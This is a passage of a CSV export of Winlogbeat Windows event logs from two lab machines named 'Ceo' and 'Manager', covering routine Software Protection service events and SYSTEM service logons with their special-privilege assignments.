RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:58:37Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3909,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:26:19.737",k3jzA4QByII7dpeEKtwM,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:26:19.998","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:19Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:19Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4774,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:26:07.757","OHjyA4QByII7dpeE-tzz",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:26:07.926","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3908,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:25:49.346",vXjyA4QByII7dpeEs9sK,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:25:49.532","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4773,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:24:24.437",JnjxA4QByII7dpeEatkN,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:24:25.343","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:59:24Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:59:24Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3907,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:24:10.700",injxA4QByII7dpeEMdhl,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:24:10.873","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:10Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:10Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4772,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:23:54.315",InjwA4QByII7dpeE9thq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:23:55.759","Oct 23, 2022 @ 16:23:54.215",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"3,472","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28776,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:23:54.315",I3jwA4QByII7dpeE9thq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:23:55.759","Oct 23, 2022 @ 16:23:54.217",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"3,472","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28777,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:23:54.287",HnjwA4QByII7dpeE8thr,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:23:54.740","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3906,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:23:40.588",snjwA4QByII7dpeEwteQ,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:23:42.509","Oct 23, 2022 @ 16:23:40.942",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"5,104","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31168,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:23:40.588",s3jwA4QByII7dpeEwteQ,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:23:42.509","Oct 23, 2022 @ 16:23:40.943",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"5,104","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31169,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:23:40.565",rnjwA4QByII7dpeEvteV,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:23:41.494","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4771,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:20:12.367",lnjtA4QByII7dpeEj9B3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:20:12.928","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:59:12Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:59:12Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3905,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:19:42.024",13jtA4QByII7dpeEGM9U,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:19:42.430","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3904,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:19:28.505",mnjsA4QByII7dpeE5M9i,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:19:29.154","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:27:28Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:27:28Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4770,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:18:57.153",WXjsA4QByII7dpeEac6A,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:18:57.711","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4769,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:18:57.102",9XjsA4QByII7dpeEhs64,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:18:58.727","Oct 23, 2022 @ 16:19:03.461",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
